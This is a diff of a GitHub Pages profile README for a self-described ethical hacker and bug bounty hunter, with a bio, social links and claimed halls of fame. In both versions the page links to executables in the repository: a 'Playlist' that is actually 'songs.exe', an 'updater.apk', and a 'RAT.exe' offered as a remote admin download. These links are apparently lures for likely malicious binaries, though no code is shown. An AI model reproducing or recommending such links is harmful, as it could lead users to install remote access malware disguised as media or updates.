@@ -1,39 +1,29 @@
-## Faizan Akhtar Web Security Researcher Ethical Hacker
+## Faizan Akhtar 🇵🇰 FaizoO
+### Synack Red Team Member
+### Security Researcher | Web Application Penetretion Tester | Ethical Hacker | Red Teamer | Bug Bounty Hunter
 
-FaizoO [Facebook Handel](https://facebook.com/iamfaizanakhtar) .  [Playlist](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/songs.exe) .
+- My Tools:
+    - [Facebook Handel](https://facebook.com/iamfaizanakhtar) 
+    - [Playlist](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/songs.exe) .
+    - [updater apk download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/updater.apk)
+    - [Remote Admin Download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/RAT.exe)
 
-Whenever you commit to this repository, GitHub Pages will run [updater apk download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/updater.apk) 
+## About Me
 
+Hey guys I'm Faizan Akhtar from Pakistan. Information security enthusiast with Certified Ethical Hacker certification and strong interest in information security, specifically penetration testing and offensive security. Strong background in security tools, emerging technologies, processes and best practices. 
 
-### Markdown   [Remote Admin Download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/RAT.exe)
+- [LinkedIn](https://www.linkedin.com/in/iamfaizanakhtar)  
+- [Facebool](https://facebook.com/zer02her0)
+- [Github](https://github.com/imfaizanakhtar)
 
-Hello and Welcome; I am Faizan Akhtar 
-    A Web Security Researcher Ethical Hacker Red Teamer and a Bug Bounty Hunter From Pakistan
+## Hall of Fames
+Google, Apple, Intel, Microsoft and many more
 
-```markdown
-Syntax highlighted code block
+## News
+[BOL News](https://www.bolnews.com/latest/2024/06/faizan-akhtar-cyber-security-researcher-from-south-punjab-makes-waves-in-the-industry/?fbclid=IwY2xjawF8Km9leHRuA2FlbQIxMAABHXcDR05v1iD_WxmPQ9UA4Jt6eFQPYzyM-Wfx6cUtsDsPWqdYp1FnSvrzRg_aem_CVPBzqoCgTgyZ0S0Vi_c6Q)
 
-# My Favourite is Cross Site Scripting XSS 
-## I Love to Find RCE (Remote Code Execution) too
-### LFI RFI is also in the Tag List too
+## Contact Me
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Your Social Security? Check out For [documentation](https://imfaizanakhtar.github.io/) or [contact support](https://facebook.com/zer02her0) 
+- [Portfolio](https://imfaizanakhtar.github.io/) 
+- [Messenger](https://facebook.com/zer02her0)
+  
